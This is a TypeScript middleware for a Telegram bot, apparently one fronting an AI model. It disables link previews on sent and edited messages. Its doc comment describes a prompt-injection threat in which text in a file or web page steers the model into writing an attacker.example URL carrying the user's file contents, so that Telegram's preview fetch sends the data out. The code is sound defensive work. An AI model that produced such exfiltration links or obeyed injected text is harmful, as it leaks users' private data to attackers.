import type { Context, MiddlewareFn } from "telegraf";

/**
 * Telegram fetches every link in a message to build a preview card, from Telegram's
 * own servers. If the model (steered by text in a file or web page) writes
 * https://attacker.example/?data=<your file contents> into a reply, Telegram would send
 * that request for it, and the attacker's server would receive the data.
 *
 * So every message the bot sends or edits gets link previews turned off.
 * (Links stay clickable. Only the automatic fetch is switched off.)
 */
const METHODS = new Set(["sendMessage", "editMessageText"]);
const MARK = Symbol.for("adarshclaw.noLinkPreviews");

export const noLinkPreviews: MiddlewareFn<Context> = async (ctx, next) => {
  const tg = ctx.telegram as any;
  if (!tg[MARK]) {
    const original = tg.callApi.bind(tg);
    tg.callApi = (method: string, payload: any, extra?: any) =>
      original(
        method,
        METHODS.has(method) ? { ...payload, link_preview_options: { is_disabled: true } } : payload,
        extra,
      );
    tg[MARK] = true; // never wrap twice
  }
  return next();
};